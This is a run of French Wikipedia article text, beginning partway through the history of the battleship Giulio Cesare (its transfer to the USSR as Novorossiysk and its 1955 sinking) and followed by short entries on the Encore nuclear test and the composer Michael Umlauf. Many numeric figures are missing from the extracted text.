Pendant le conflit, il avait effectué 38 missions de guerre, dont 8 pour la recherche de l'ennemi, 2 pour l'escorte de convois et la protection du trafic national, 14 pour des transferts et 14 pour des exercices, pour un total de () et de missions.
Pendant la cobelligérance, il a effectué 4 missions de transfert, couvrant nautiques () pour de mouvement.
Le traité de paix.
À la fin de la guerre, conformément aux termes du traité de Paris, le cuirassé a été cédé à l'Union soviétique à titre de compensation pour les dommages de guerre. Le traité stipulait que les navires destinés à être cédés devaient être remis dans un état opérationnel, et par conséquent, avant la cession, l'unité a subi quelques travaux, effectués dans le chantier naval de Palerme.
Les dures conditions imposées par le traité de paix concernant la flotte, divisée entre les vainqueurs et avec des limitations considérables pour l'avenir, ont conduit en décembre 1946 à la démission du chef d'état-major de la marine, l'amiral Raffaele de Courten, protestant contre les conditions imposées par le traité, qui ne tenaient pas compte de l'attitude loyale tenue par la Marina Militare pendant toute la période de cobelligérance depuis l'armistice.
La remise des navires aux nations victorieuses, et en particulier à l'Union soviétique, où des milliers de prisonniers de guerre italiens étaient encore détenus, a suscité un tel émoi parmi les équipages de la "Marina Militare" et une telle indignation dans toute l'Italie que pendant les derniers mois précédant la remise, des mesures de surveillance exceptionnelles ont été prises par le biais de patrouilles, tant sur les quais que dans l'ensemble du port, et des inspections sous-marines continues ont été effectuées autour des coques des navires destinés à être remis, des hommes-grenouilles plongeant toutes les trente minutes, de crainte que des charges explosives capables de les faire couler ne soient appliquées. Parmi les unités qui devaient être remises aux Soviétiques et qui étaient les plus susceptibles d'être l'objet de sabotage, il y avait le cuirassé "Giulio Cesare" et le navire-école "Cristoforo Colombo", et on découvrit également que des membres des "Fasci di Azione Rivoluzionaria" (FAR ou Faisceaux d'Action Révolutionnaire) et des vétérans du "Xe Flottiglia MAS" avaient planifié le naufrage du "Cristoforo Colombo", qui était un mythe pour tous les marins, ayant formé des générations d'officiers, et qui devait être sauvé de la honte d'être remis à l'étranger.
En particulier, en plus du "Giulio Cesare" et du "Colombo", les Soviétiques obtiennent le croiseur "Emanuele Filiberto", les destroyers "Artigliere" et "Fuciliere", les torpilleurs de la Classe Ciclone : "Animoso", "Ardimentoso" et "Fortunale", et les sous-marins "Nichelio" et "Marea", ainsi que le destroyer "Riboty", qui n'a pas été retiré en raison de son obsolescence, et d'autres navires tels que des vedettes-torpilleurs MAS et des torpilleurs, des vigies, des pétroliers, des péniches de débarquement, un navire de transport et douze remorqueurs. Hormis le "Riboty", une petite partie de la part prévue par les Soviétiques n'a pas été retirée en raison de son mauvais état, et pour cette partie du navire, les Soviétiques ont accepté une compensation financière.
Les Soviétiques ont essayé d'obtenir l'un des deux cuirassés modernes "Littorio", qui, n'ayant pas été retirés par les États-Unis et l'Angleterre, à qui ils avaient été attribués, ont été laissés à l'Italie avec la stipulation qu'ils seraient mis au rebut. Les Soviétiques, n'ayant pas réussi à obtenir l'une ou l'autre des deux unités modernes, ont exigé que les plat-bords soient coupés au chalumeau et les pales de la turbine détruites à la masse.
La livraison des navires aux Soviétiques devait se faire en trois étapes, de décembre à juin 1948. Les unités principales étaient celles du premier et du deuxième groupe. Le cuirassé fait partie du premier groupe, avec le "Artigliere" et les deux sous-marins, tandis que le second groupe comprend le "Emanuele Filiberto", le navire-école et les torpilleurs. Pour tous les navires, la livraison devait avoir lieu dans le port d'Odessa, à l'exception du cuirassé et des deux sous-marins qui devaient être livrés dans le port albanais de Vlora, car la convention de Montreux n'autorise pas le passage par les Dardanelles des cuirassés et des sous-marins appartenant à des États enclavés dans la mer Noire. Le transfert devait se faire avec des équipages civils italiens sous le contrôle de représentants soviétiques et avec des navires battant pavillon de la marine marchande, les autorités gouvernementales italiennes étant responsables des navires jusqu'à leur arrivée dans les ports où ils devaient être livrés. Afin de prévenir d'éventuels sabotages, les navires des deux premiers groupes seraient amenés à leurs ports de destination sans munitions à bord, qui seraient ensuite transportées à destination par des cargos normaux, à l'exception du cuirassé, qui a été livré avec de munitions, qui comprenaient également des canons principaux et l'ensemble des 32 torpilles de des deux sous-marins.
Novorossiysk.
Le 9 décembre 1948, le cuirassé est transféré de Tarente à l'arsenal d'Augusta, où le 15 décembre 1948 il est désarmé avec les unités du premier groupe.
Le navire a été définitivement rayé du registre naval italien à compter du 15 décembre 1948 par décret du Président de la République du 29 avril 1949.
À la base d'Augusta, en janvier 1949, arrive un groupe de d'équipage des unités livrées, dont le commandant du cuirassé, le capitaine de rang Jurij Zinov'ev (en russe : "Юрий Зиновьев") qui avait commencé sa carrière comme simple marin pendant la Première Guerre mondiale et qui, pendant la Seconde Guerre mondiale, avait commandé le croiseur "Molotov" et, à partir du printemps 1942, le cuirassé "Parižskaja Kommuna". Le 19 janvier, le commandant Zinov'ev meurt subitement d'une crise cardiaque et est remplacé par le commandant de rang égal Boris Beljaev, qui avait commandé pendant le conflit le destroyer "Baku", une escadre de destroyers et à partir d'avril 1944 le croiseur "Murmansk".
La première unité à être livrée aux Soviétiques a été le "Artigliere", qui avec les initiales "Z 12" a atteint Odessa le 21 janvier avec un équipage de la marine marchande, faisant partie de la marine soviétique à partir du 23 janvier, tandis que pour le cuirassé la livraison aux Soviétiques a eu lieu dans le port albanais de Vlora, atteint avec un équipage de la marine marchande, en même temps que les deux sous-marins.
Le cuirassé, parti d'Augusta le 2 février, naviguant à la vitesse de 16 nœuds (), atteint Vlora le 3 février, où, sous la marque "Z 11", a lieu le transfert temporaire à la commission soviétique, dirigée par le contre-amiral Gordej Ivanovič Levčenko. Le 6 février, jour où le transfert du cuirassé a été formalisé par la signature du protocole de transfert, le pavillon de la Marine soviétique a été hissé pour la première fois à bord de l'unité. Le lendemain, 7 février, le transfert des deux sous-marins est également formalisé.
Ayant quitté sa nouvelle base de Sébastopol le 15 février, avec les deux sous-marins "Marea" (Z 13) et "Nichelio" (Z 14), le bâtiment est arrivé à destination le 26 février et, le 5 mars 1949, a été rebaptisé Novorossijsk (en russe : Новороссийск) et incorporé à la flotte de la mer Noire. Le nom donné au navire rappelle le siège de Novorossiïsk, lorsque la ville de Novorossiïsk, sur la côte orientale de la mer Noire, a constitué un bastion contre l'offensive allemande au cours de l'été 1942. D'intenses combats se sont déroulés dans et autour de la ville, d'août à septembre 1942, au cours desquels les Soviétiques ont réussi à maintenir la possession de la partie orientale de la baie, empêchant les Allemands d'utiliser le port pour livrer du matériel ; la ville recevra le titre de ville héroïque en 1973 en commémoration du siège.
Lors de la conférence de Moscou, après la capitulation de l'Italie et sa sortie de l'Axe, l'Union soviétique avait déjà exigé une part substantielle de la marine militaire et marchande italienne en guise de réparation de guerre, y compris un cuirassé, lors de la rencontre entre les ministres des affaires étrangères des trois principales puissances alliées, Eden, Hull et Molotov, et avait réitéré cette demande lors de la rencontre entre Staline, Roosevelt et Churchill à la conférence de Téhéran, en trouvant le soutien du président américain ; mais l'Italie étant à ce moment-là en cobelligérance avec les Alliés, la division de la flotte italienne n'a pas été considérée opportune ; aussi les Soviétiques reçurent en échange, comme un prêt, des Américains et des Britanniques quelques unités, en attendant qu'avec la fin du conflit le destin de la flotte italienne ait été décidé. Parmi les navires prêtés aux soviétiques figurent plusieurs destroyers de classe Town, trois sous-marins de Classe U, le croiseur léger américain de classe Omaha Milwaukee, rebaptisé "Murmansk", et l'ancien cuirassé britannique , entré au service des Soviétiques le 30 mai 1944 et rebaptisé "Arkhangelsk". Ce dernier a été rendu aux Britanniques le 4 février 1949, le jour après que les Soviétiques ont reçu le "Giulio Cesare" de l'Italie. Toutes ces unités ont servi dans la flotte du Nord et ont été restituées à la fin du conflit, à l'exception d'un destroyer perdu pour cause de guerre.
La marine soviétique avait encore en service les cuirassés "Oktjabr'skaja Revoljucija" et "Parižskaja Kommuna", deux vieilles unités de la classe Gangut, datant de la Première Guerre mondiale et modernisées dans les années 1930. L'entrée en service du cuirassé italien, de conception plus moderne que les cuirassés qu'elle avait en service jusqu'alors, devait servir à préparer les équipages, en attendant que les cuirassés du projet 82 de la classe Stalingrad soient achevés.
Au moment de la livraison, le navire était dans un état très négligé, car il avait été très mal entretenu de 1943 à 1948, à l'exception de quelques réparations mineures sur des pièces électromécaniques, effectuées à Palerme juste avant son transfert en Union soviétique. Le navire avait de la rouille à plusieurs endroits, les soubassements des superstructures étaient en très mauvais état, et il y avait de nombreux coquillages fixés le long de la ligne de flottaison. La plupart des armes étaient dans un état satisfaisant, à l'exception de l'armement anti-aérien secondaire, et la centrale électrique principale, ainsi que les œuvres vives qui avaient été traités avec des peintures anti-salissures, tandis que les vannes et les tuyauteries étaient en très mauvais état et les générateurs diesel de secours étaient pratiquement inutilisables. Les tuyaux du système de lutte contre l'incendie et les tubes des chaudières étaient pleins de saletés ; quant aux cuisines, seule celle du carré des officiers était pleinement fonctionnelle. Les postes de l'équipage n'étaient pas non plus adaptés aux caractéristiques climatiques de la région de la mer Noire, puisque le navire était conçu pour opérer en Méditerranée et que les postes d'équipage étaient mal isolés de l'extérieur, ce qui, en hiver, lorsque la différence entre la température à l'intérieur des pièces chauffées et la température extérieure beaucoup plus froide était plus grande, provoquait la formation de condensation, en particulier dans la zone de la proue, avec pour conséquence qu'il pleuvait à l'intérieur des locaux. Le commandement de la flotte de la mer Noire a essayé de transformer le bâtiment aussi rapidement que possible en une véritable unité de combat, mais la situation était compliquée par le fait qu'une grande partie de la documentation, exclusivement en italien, n'était pas compréhensible.
Du 12 mai au 18 juin 1949, le navire est entré dans le bassin pour des travaux d'entretien et le nettoyage et la réparation des œuvres vives (carène).
Au cours de l'été 1949, le cuirassé participe aux manœuvres de la flotte de la mer Noire en tant que navire-amiral, mais sa participation est davantage symbolique, car l'équipage a eu peu de temps pour se familiariser avec le navire. Toutefois, sa participation est destinée à démontrer la capacité des marins soviétiques à faire fonctionner des navires italiens. Plus tard, le cuirassé a également été utilisé comme navire d'entraînement pour les artilleurs.
Entre 1950 et 1955, le navire est retourné en bassin à plusieurs reprises pour des travaux de modernisation et d'entretien.
Le bâtiment est passé au bassin pour des travaux d'entretien en juillet 1950 ; puis en 1951, une première fois du 29 avril au 22 juin et une seconde fois en octobre ; puis en 1952 (en juin), et en 1953 pour des travaux de modernisation ; puis à nouveau pour des travaux d'entretien en novembre 1954 et en 1955 du 13 février au 29 mars.
Au cours des travaux de modernisation effectués en 1953, le navire a été équipé d'un radar, de nouveaux équipements de communication radio et d'une nouvelle direction de tir pour les canons principaux. L'armement anti-aérien a été reconfiguré avec le retrait des canons 37/ et des mitrailleuses 20/, remplacés par 30 canons 37/, avec vingt-quatre canons répartis en douze systèmes jumelés 37/ K-66 refroidis par eau avec une cadence de tir de 320-360 coups par minute, et six canons simples 37/ 70-K refroidis par air avec une cadence de tir de 150 coups par minute. Les générateurs diesel de secours ont également été remplacés.
D'autres modifications concernent la tour avant, où sont installés des radars et des appareils électroniques, et le système de propulsion, avec le remplacement des turbo-réducteurs par des turbines Kharkov de fabrication soviétique qui permettent au navire d'atteindre une vitesse maximale de 27 nœuds (). On a également envisagé de remplacer les tourelles principales par les tourelles de 305/ des unités de la classe Gangut qui avaient été déclassées, étant donné que le navire avait été livré avec seulement une réserve de munitions pour les canons de et la difficulté conséquente de trouver des munitions pour ces canons. Cette idée ayant été écartée, la production de munitions pour les canons de fabrication italienne a été lancée. Les travaux de modernisation ont entraîné une légère surcharge du navire d'environ , avec une diminution de la stabilité en raison du changement de de la hauteur métacentrique.
Au cours de l'été 1955, à partir du mois de mai, le cuirassé participe aux activités opérationnelles de la flotte de la mer Noire, menant une intense activité d'entraînement avec de nombreuses sorties en mer jusqu'à la fin du mois d'octobre.
Le naufrage.
Le soir du 28 octobre 1955 après être revenu d'un voyage pour participer aux célébrations du centenaire de la défense de Sébastopol, le navire est amarré sur coffre dans la baie de Sébastopol à du rivage, devant un hôpital. À 1h30 du matin, dans la nuit du 29 octobre, une explosion, d'une force estimée à de TNT sous la coque, a déchiré tous les ponts du blindage, du pont inférieur au pont de gaillard, ouvrant une entaille dans la coque de plus de carrés de part et d'autre de la quille, sur de long. Le navire a chaviré en trois minutes, à du rivage, où la profondeur d'eau était de , avec supplémentaires de boue visqueuse au fond de la baie de Sébastopol. À bord du "Novorossiysk" se trouvaient un millier de marins: une partie de l'équipage et 200 cadets. Au moment de l'explosion, on estime que 150 à d'équipage ont perdu la vie dans la zone de l'explosion.
Sur le pont du gaillard d'avant, le trou mesurait . L'explosion était si forte qu'elle a également été enregistrée par des sismographes en Crimée.
À 2h00, le commandant des opérations de la flotte, le capitaine de rang Ovčarov, ordonne de « remorquer le navire vers un endroit peu profond », mais à 2h32, le navire s'incline à tribord, tandis que les remorqueurs traînent le cuirassé. Après , le navire s'est incliné de 17 degrés, alors le chef d'état-major de la flotte de la mer Noire, le contre-amiral Nikolaï Ivanovič Nikolskij, a demandé au commandant de la flotte de la mer Noire, le vice-amiral Viktor Aleksandrovič Parchomenko, et au vice-amiral Nikolaï Michajlovič Kulakov, du Conseil militaire de la flotte de la mer Noire, d'évacuer les marins non nécessaires aux travaux de sauvetage, mais la réponse a été négative.
Le navire a coulé lentement par l'avant, chavirant sur son côté bâbord, à 4h15, et après l'explosion, alors qu'il avait déjà pris plus de d'eau, avec des centaines de marins, qui étaient sur le pont, tombant dans l'eau et recouverts par la coque du cuirassé. Le chavirement a été accéléré par l'inondation des ponts, provoquée par l'équipage lui-même, pour empêcher l'explosion des magasins de munitions restants. Le navire est resté dans cette position avec le mât planté dans le fond marin et, à , la coque avait complètement disparu sous l'eau, avec des centaines de marins piégés dans les compartiments du navire. Il s'agit de la plus grande catastrophe de l'histoire de la marine russe, aggravée par l'inexpérience de l'équipage et l'impréparation des sauveteurs et des officiers du navire lui-même, qui aurait pu être remorqué en eau peu profonde, évitant ainsi le chavirement, avec pour résultat que la plupart des victimes sont restées coincées dans les compartiments du navire. Compte tenu du temps écoulé entre l'explosion et le chavirement du cuirassé, l'équipage aurait pu être évacué. Entre 50 et 100 marins sont morts dans l'explosion et dans les compartiments immédiatement immergés. Les autres sont morts lorsque le navire a chaviré. Après le chavirement du navire, de plus petits navires et des canots de sauvetage sont intervenus et ont sauvé de nombreux survivants des eaux glacées. Seuls neuf marins piégés à bord ont été sauvés: des plongeurs ont pu récupérer deux hommes piégés dans une poche d'air après , tandis que sept autres ont été sauvés en découpant un trou dans la zone arrière cinq heures après le chavirement.
Le naufrage a coûté la vie à 604 marins, y compris certains marins des équipes de sauvetage, dont cinq du croiseur "Molotov", qui ont perdu la vie lorsque le cuirassé "Novorossiysk" a chaviré.
Le Kremlin a initialement affirmé que la tragédie avait été déclenchée par des incendies accidentels à bord, mais en raison du climat politique de la guerre froide, le sort du "Novorossiysk" est resté flou jusqu'à la fin des années 1980. Aujourd'hui encore, les causes de l'explosion ne sont pas claires, car les informations sur ce qui est arrivé au cuirassé n'ont pas été entièrement déclassifiées.
Afin d'élucider les causes de l'explosion, une commission gouvernementale est immédiatement mise en place, qui présente ses conclusions au Comité central du PCUS le 17 novembre 1955.
La commission gouvernementale dirigée par le colonel général Viatcheslav Malychev, vice-président du Conseil des ministres de l'URSS et ministre de l'industrie de la construction navale, a conclu que la cause la plus probable de la catastrophe était « l'explosion sous-marine externe (sans contact) d'une charge équivalente à de TNT », probablement un RMH magnétique déposé par les allemands pendant la Seconde Guerre mondiale et laissé dans les fonds marins boueux. Malychev lui-même, dès 1939, commissaire du peuple pour l'industrie lourde, envoyé pour inspecter le navire lors de la préparation de son transfert en Union soviétique, avait exprimé un avis défavorable à sa vente, considérant le navire non seulement comme ayant une valeur de guerre dépassée, mais aussi comme étant d'une utilité limitée en raison de la détérioration générale de l'équipement et des structures résultant de l'entretien limité auquel l'unité avait été soumise pendant toute la période d'internement et de cobelligérance. L'avis de Malychev n'a toutefois pas été pris en compte par Staline pour des raisons de prestige diplomatique.
La responsabilité principale de l'énorme perte de vies humaines est directement attribuée aux actions incompétentes du commandant de la flotte de la mer Noire, le vice-amiral Parchomenko, qui a été démobilisé le 8 décembre 1955 et qui, refusant d'abandonner le navire, a invité tout le monde à retourner à son poste, en assurant que le navire n'était pas en danger.
En plus de sous-estimer le danger que courait le navire, Parchomenko ne connaissait pas les conditions du fond marin, ayant cru que la différence entre la profondeur de la mer () et la largeur du navire () empêcherait le chavirement. Mais la couche superficielle du fond marin, composée de boue molle à de profondeur, n'offrait aucune résistance. Il a été rapporté que, pendant cette situation critique, le commandant a fait preuve d'une bravade et d'un calme sans faille et a même exprimé le désir d'« aller prendre le thé ».
Le commandant du cuirassé, le capitaine Aleksandr Pavlovič Kuchta, qui était en vacances au moment de la catastrophe, est rétrogradé et envoyé dans la réserve. Ont également été déchargés et rétrogradés le commandant de la division navale de la zone de protection des eaux, le contre-amiral Anatolij Aleksandrovič Galickij, le chef d'état-major de la flotte de la mer Noire, le contre-amiral Nikolskij et le membre du Conseil militaire, le vice-amiral Kulakov.
Le rapport de la Commission a souligné certains exemples de courage et de véritable héroïsme des membres de l'équipage, qui ont été contrecarrés par le comportement de Parchomenko.
Selon l'avis de l'ingénieur naval et historien militaire Oleg Teslenko, la mine, heurtée par une ancre, a explosé et aurait provoqué l'explosion subséquente du réservoir de carburant utilisé pour ravitailler les annexes embarquées. Au cours des deux années suivantes, les plongeurs ont trouvé 19 mines magnétiques au fond de la baie de Sébastopol ; onze d'entre elles avaient une puissance correspondant à celle de l'explosion sous le "Novorossiysk", et trois d'entre elles se trouvaient à une distance de moins de du lieu de l'explosion. Cette explication suscite toutefois de nombreux doutes. Le site du "Novorossiysk" était considéré comme propre, il avait déjà été utilisé plusieurs fois par d'autres navires et les derniers relevés avaient été effectués dans la période 1951-1953. Certains experts affirment que le déclencheur électrique des mines magnétiques ne pouvait plus fonctionner après , en raison de la durée de vie maximale des piles (qui était de ). Certains experts estiment que la taille du cratère au fond ( de profondeur) est trop petite pour une mine de cette taille. En revanche, les dégâts subis par le navire étaient considérables, et selon certains chercheurs, équivalents à de TNT; de plus, le navire étant amarré à un coffre, il n'avait pas jeté l'ancre.
Une explication plus théâtrale est l'hypothétique vengeance d'anciens membres de la Xe Flottiglia MAS de Borghese pour le transfert d'un cuirassé italien à l'Union soviétique grâce à leur mission secrète. On rapporte que peu de temps après, un petit groupe de plongeurs italiens a reçu des décorations militaires. Le sabotage aurait été effectué soit en plaçant une charge explosive sous la quille, soit à l'aide d'une torpille lancée depuis un mini-sous-marin qui aurait pénétré dans la rade. Le type de brèche, selon les experts, semble exclure, mais pas complètement, l'hypothèse de la torpille. Les hommes et les moyens de sabotage auraient été amenés là par certains navires marchands italiens qui se trouvaient à l'époque dans les ports de Crimée, et de plus les hommes du " MAS" connaissaient parfaitement la région pour y avoir opéré pendant la Seconde Guerre mondiale. L'historien russe Nikolaj Čerchašin, à l'appui de cette hypothèse, note dans un article écrit dans la revue "Soveršenno sekretno" (en cyrillique : Совершенно секретно) que le cuirassé avait été allongé de dix mètres pendant les travaux de rénovation, avec l'ajout d'une nouvelle section à l'avant, et que son point faible se situait à la jonction de l'ancienne coque avec les nouveaux éléments structurels à l'avant, le point où l'explosion s'est produite ; et que les raiders qui auraient effectué le sabotage auraient probablement été conscients des faiblesses structurelles du navire, plaçant une charge de TNT précisément à l'un de ces points. Cependant, il n'existe aucune preuve solide pour confirmer cette hypothèse, qui a également été démentie par l'amiral Gino Birindelli (qui, selon cet historien russe, aurait été parmi les membres du groupe qui aurait effectué le sabotage), et qui a commenté l'histoire de la vengeance romantique italienne comme « une autre connerie vendue par un Russe ».
L'hypothèse d'un sabotage étranger fait également apparaître les Britanniques, qui auraient organisé l'action en utilisant également des hommes-grenouilles italiens, par crainte que le cuirassé ne soit équipé d'armes nucléaires, et en raison du fait qu'à la fin du mois d'octobre 1955, une escadrille navale britannique aurait effectué des exercices dans les mers Égée et de Marmara.
Cependant, au fil des ans, les Russes ont plusieurs fois évoqué un sabotage étranger avec une implication italienne pour l'explosion du navire. En 1999, le journal "Segodnia" avait même écrit que l'action faisait partie d'un plan plus vaste d'invasion de l'Union soviétique, bloqué par l'Organisation du traité de l'Atlantique nord (OTAN) au dernier moment. Selon l'agence de presse russe RIA Novosti, la commission gouvernementale chargée d'enquêter sur les faits n'aurait pas exclu que l'explosion du cuirassé soit le signal du début des opérations militaires de l'OTAN contre l'Union soviétique. Au cours de la seconde moitié d'octobre 1955, il y avait eu une concentration massive de la marine américaine (U.S. Navy) et des marines d'autres États en Méditerranée orientale. De plus, l'explosion du cuirassé aurait pu entraîner la détonation des dépôts de munitions des navires amarrés à proximité du "Novorossiysk", ce qui aurait gravement endommagé la base principale de la flotte de la mer Noire.
Il convient toutefois de noter qu'une telle action aurait pu provoquer le déclenchement de la troisième guerre mondiale si elle avait été découverte, et aurait donc été une opération très risquée.
L'hypothèse selon laquelle le naufrage serait dû à un sabotage italien a été rappelée avec force détails par le magazine russe "Itoghi" en 2005 à l'occasion du cinquantième anniversaire du naufrage et rapportée dans un article publié le 25 octobre 2005 dans le journal génois "Il Secolo XIX". Selon ce magazine russe, l'hypothèse la plus crédible est que le naufrage serait dû à des bombes à retardement placées sur la quille par des saboteurs italiens, possiblement huit hommes-grenouilles sous les ordres des services secrets italiens. Selon ce magazine, les services secrets italiens de l'époque ont agi pour le compte de l'OTAN afin d'empêcher que le cuirassé, qui appartenait à la Regia Marina, soit équipé de missiles nucléaires, et les services ont trouvé des complices enthousiastes parmi les vétérans du Decima Mas, qui considéraient la vente du cuirassé comme un « acte de déshonneur ».
Le magazine, rappelant qu'à l'époque seuls deux États de l'OTAN, l'Italie et la Grande-Bretagne, disposaient de personnel formé pour une telle entreprise, affirme que le seul des protagonistes de cette entreprise encore en vie, aurait raconté les détails de l'exploit à un ancien officier soviétique, rencontré par hasard lors de vacances en Floride.
Une autre théorie suggère que des explosifs avaient été cachés à bord avant d'être remis aux russes. À l'appui de cette seconde hypothèse, Nikolaj Čerchašin souligne lui-même que, lors des travaux de rénovation, la nouvelle proue avait été partiellement superposée à l'ancienne, créant des brèches, et que la charge explosive principale a pu être dissimulée dans un double fond avant la remise du navire aux soviétiques, considérant également que les russes avaient une connaissance très superficielle de certains éléments structurels du navire, les documents techniques sur les matériaux utilisés n'étant rédigés qu'en italien et tous les doubles fonds du cuirassé n'ayant donc pas été inspectés. Cependant, aucune trace de sabotage n'a jamais été trouvée et, bien que les enquêtes soviétiques n'aient pas complètement exclu cette possibilité, en raison des mauvaises mesures de sécurité de la flotte la nuit de l'explosion, les plaques de la coque se sont pliées vers l'intérieur comme si l'explosion s'était produite sous la quille, à l'extérieur. Selon l'opinion de Jurij Lepechov, officier mécanicien du cuirassé "Novorossiysk", la cause de l'explosion pourrait être la détonation d'une (ou peut-être même de deux) mines magnétiques allemandes ; mais en même temps, puisque la coque a été complètement pénétrée par l'explosion, et le fait que le trou dans le fond ne coïncide pas avec les trous dans le pont, la mine pourrait avoir causé la détonation des explosifs qui avaient été cachés dans les doubles fonds du navire.
Selon une autre théorie de la conspiration, le naufrage du cuirassé "Novorossiysk" était une action des services secrets russes pour accuser la Turquie de sabotage, afin d'avoir un prétexte pour l'occupation du Bosphore et du détroit des Dardanelles. Il n'y a aucune preuve pour soutenir cette théorie.
Il existe encore une autre théorie de la conspiration, qui attribue le naufrage du "Novorossijsk" à des agents du KGB afin de discréditer les dirigeants de la marine.
En raison de la perte du "Novorossijsk", le vice-premier ministre de la Défense et commandant en chef de la marine Nikolaï Guerassimovitch Kouznetsov est démis de ses fonctions en novembre 1955, et en février 1956, il est rétrogradé du rang d'amiral de la flotte de l'Union soviétique au rang de vice-amiral et définitivement retiré du service actif.
Lors du Plénum du Comité central de l'URSS du 29 octobre 1957, Nikita Khrouchtchev déclare : « Nous avons dépensé plus de de roubles pour la flotte, en construisant de vieux navires et des destroyers armés d'artillerie. J'ai mené une grande lutte, mais Kouznetsov a évité de penser à s'occuper de la flotte et a échoué. Il est nécessaire de tout évaluer d'une manière nouvelle. Nous devons construire une flotte, mais surtout une flotte de sous-marins armés de missiles ». Le plan décennal de construction navale ne reflétait pas les nouvelles priorités de l'avenir, et le développement plus capitalistique et rentable exigé du complexe militaro-industriel afin de construire les forces nucléaires navales stratégiques souhaitées par les dirigeants politiques et militaires de l'URSS a scellé le sort du commandant en chef de la marine, Kouznetsov. Après la disparition du cuirassé "Novorossiysk", la réduction massive de la marine soviétique a commencé, avec la mise au rebut des cuirassés obsolètes "Parižskaya Kommunaja" et "Oktjabr'skaja Revoljucija", du croiseur "Kerch", des vieux sous-marins et d'autres navires construits avant la Seconde Guerre mondiale.
L'amiral Kouznetsov ne sera réhabilité à titre posthume par le Praesidium de l'Union soviétique qu'en 1988, soit après le naufrage et après sa mort en 1974.
Les autorités soviétiques ont décidé de dissimuler la catastrophe, et aucune mention n'en a été faite dans la presse nationale. Les victimes ont été enterrées dans une fosse commune dans un cimetière militaire local et les survivants, réaffectés dans d'autres départements, ont reçu l'ordre de ne pas parler de l'événement.
Les premières prospections pour la récupération de l'épave ont commencé à l'été 1956, par une expédition appelée « EON 35 ». Les préparatifs ont été achevés à la fin du mois d'avril 1957, et le 30 avril, les premières opérations ont commencé. La coque a été ramenée à la surface dans l'après-midi du 4 mai et, malgré la pluie, une foule nombreuse s'est précipitée sur les rives et les collines entourant la ville pour assister à la récupération. Le 14 mai, la coque a chaviré et s'est enfoncée dans une petite baie à la périphérie de la ville, appelée la baie des Cosaques. Le cuirassé a ensuite été désarmé et mis à la ferraille à l'usine Zaporozhistal, tandis qu'un des canons de du navire est resté exposé dans une école navale de Sébastopol jusqu'en 1971.
Dix-neuf ans plus tard, la flotte de la mer Noire sera endeuillée par un autre accident tragique, lorsque le "Otvažnyj", un destroyer de la Classe Kachine, connaîtra une formidable explosion à bord le 29 août 1974, probablement dans une soute à missiles, coulant au fond de la mer Noire après cinq heures d'incendie, dans lequel plus de 200 des d'équipage perdront la vie.
Fin décembre 1999, le premier ministre de l'époque, Vladimir Poutine, a rendu hommage à sept marins survivants du cuirassé, qui ont été décorés par un décret du président Boris Eltsine.
Le "Giulio Cesare" dans la littérature.
Dans "Lo Zar non è morto" (Le Tsar n'est pas mort), un roman collectif publié en 1929 et écrit par le "Gruppo dei Dieci", on imagine que le "Giulio Cesare" a été vendu par l'Italie à la Chine, devenant ainsi le premier cuirassé de ce pays : naturellement, le fait est pertinent pour les événements du roman.

</doc>
<doc id="7277009" url="https://fr.wikipedia.org/wiki?curid=7277009" title="Upshot-Knothole Encore">
Upshot-Knothole Encore

Upshot-Knothole Encore est un essai nucléaire mené par les États-Unis pendant l'opération Upshot-Knothole. Il a eu lieu le dans le Yucca Flat, au sein du site d'essais du Nevada&lt;ref name="DOE/NV-209"&gt; U.S. Department of Energy / Nevada Operations Office, "United States Nuclear Tests - July 1945 through September 1992", Décembre 2000, DOE/NV-209 Rev 15&lt;/ref&gt;.
Localisation de l'essai.
L'engin, dont le nom de code était « Encore », détonna à , heure locale, après un lâcher aérien d'une bombe Mk-6D à d'altitude par un Boeing B-50 Superfortress, au-dessus du Frenchman Flat du site d'essais du Nevada. La bombe explosa à d'altitude, à à l'ouest et au sud de sa cible. La puissance estimée de l'arme était de 30 à , bien qu'elle ne produisit que . Le « E » du nom de code « Encore » est une référence aux « effets » des essais nucléaires.
Effets de l'essai.
Comme Encore est un essai d'effets, de multiples objets furent soumis à l'explosion, dont 145 pins ponderosa que le Service des forêts des États-Unis transporta spécialement dans le désert du site d'essais du Nevada depuis un canyon proche. Les arbres furent ensuite placés dans des trous au Frenchman Flat, et cimentés au sol, à du point d'impact. La décharge initiale de radiation thermique enflamma beaucoup d'entre eux, et les vagues d'explosion suivantes les souffla au loin.
 furent transportés pour assister à l'explosion pour les exercices "Desert Rock". Par ailleurs, de haut rang et membres du Congrès des États-Unis y assistèrent également, dans le but .

</doc>
<doc id="7277026" url="https://fr.wikipedia.org/wiki?curid=7277026" title="Septembre 1956">
Septembre 1956



</doc>
<doc id="7277038" url="https://fr.wikipedia.org/wiki?curid=7277038" title="Forêts alluviales">
Forêts alluviales



</doc>
<doc id="7277048" url="https://fr.wikipedia.org/wiki?curid=7277048" title="Michael Umlauf">
Michael Umlauf

Michael Umlauf (né le à Vienne et mort le à Baden), est un compositeur, chef d'orchestre et violoniste autrichien. Son père, Ignaz Umlauf, était aussi un compositeur. Sa sœur Elisabeth Hölzel (née Umlauf) a eu une carrière de contralto et son neveu Gustav Hölzel a été un important baryton-basse.
Biographie.
Umlauf est né à Vienne. À un âge précoce, il est devenu violoniste dans l'orchestre de la cour de Vienne. Ses premières compositions connues étaient une série de partitions de ballet pour les théâtres de la cour en date du 1804. Il est répertorié dans les archives de 1809 du théâtre comme adjoint du Kapellmeister Adalbert Gyrowetz. Dans celles de 1815, il avait avancé de la quatrième place de Kapellmeister à la sixième au Kärntnertortheater. Umlauf a pris sa retraite en 1825 à l'époque de la direction de Barbaia de l'Opéra de la Cour, et s'est présenté sans succès pour le poste de second Kapellmeister à la Stephansdom. C'est avant 1840 qu'il a de nouveau réapparu, cette fois comme directeur musical de deux théâtres de la cour, mais sa longue absence l'avait tout à fait déconnecté de la réalité et il se retira bientôt de nouveau, pour mourir à Baden près de Vienne peu de temps après.
Le nom de Umlauf est surtout associé à celui de Ludwig van Beethoven, dont il a dirigé les œuvres à de nombreuses reprises. En 1814, il a dirigé la création de la révision finale de "Fidelio". Dix ans plus tard, il a dirigé la création de la "Neuvième Symphonie" de Beethoven le .
Compositions.
Parmi les compositions de Umlauf sont surtout connus ses musiques de ballet, en particulier "Paul und Rosette oder die Winzer" (), "Amors Rache" (), "das eigensinnige Landmädchen" () et quatre Singspiele: "Die Herrenhuterin" (1804), "Das Fest der Freude und der Liebe" (1806), "Der Grenadier" () et "Das Wirtshaus von Granada" (1812).
En 1823-1824, il a été l'un des 50 compositeurs qui ont composé une variation (la variation 44) sur une valse de Diabelli pour le Vaterländischer Künstlerverein.

